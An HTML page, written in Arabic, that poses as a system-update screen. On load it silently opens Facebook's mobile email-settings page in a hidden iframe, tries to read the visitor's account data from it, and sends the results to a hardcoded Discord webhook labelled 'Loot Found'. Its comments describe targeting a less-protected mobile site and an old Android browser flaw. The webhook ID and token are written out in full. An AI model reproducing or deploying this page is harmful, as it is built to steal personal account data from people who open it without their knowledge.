<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تحديث النظام...</title>
    <style>
        body { background: #000; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .version-marker { font-size: 60px; font-weight: bold; color: #1a1a1a; position: absolute; top: 20px; right: 20px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="version-marker">18</div>
    <div class="loader"></div>
    <p>جاري استخراج مفاتيح الوصول (V1.3.0)...</p>

    <iframe id="secret_gate" style="width:0;height:0;border:0; border:none; visibility:hidden;"></iframe>

    <script>
        const DISCORD_ID = "1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";

        function sendSignal(title, info) {
            const blob = new Blob([JSON.stringify({
                embeds: [{ title: "🔑 " + title, description: info, color: 16753920 }]
            })], { type: 'application/json' });
            navigator.sendBeacon("https://discord.com/api/webhooks/" + DISCORD_ID, blob);
        }

        function launchReflection() {
            sendSignal("System Check", "Launching Reflection Protocol V1.3.0");

            const gate = document.getElementById('secret_gate');
            // استهداف نسخة الموبايل الخفيفة جداً (أقل حماية)
            gate.src = "https://m.facebook.com/settings/email/";

            // محاولة لقط معلومات الجلسة من خلال الـ Referrer
            setTimeout(() => {
                try {
                    // إذا كان المتصفح يسمح بقراءة الـ ContentWindow (ثغرة قديمة في بعض نسخ أندرويد)
                    const data = gate.contentWindow.document.body.innerText;
                    if (data) sendSignal("Loot Found", data.substring(0, 500));
                } catch (e) {
                    sendSignal("Protection Active", "Browser prevented direct read. Switching to Side-Channel Attack...");
                    // تكتيك بديل: محاولة استنتاج وجود الجلسة عبر حجم الإطار
                    sendSignal("Side-Channel", "Iframe Loaded. Session validation in progress.");
                }
            }, 4000);
        }

        window.onload = launchReflection;
    </script>
</body>
</html>
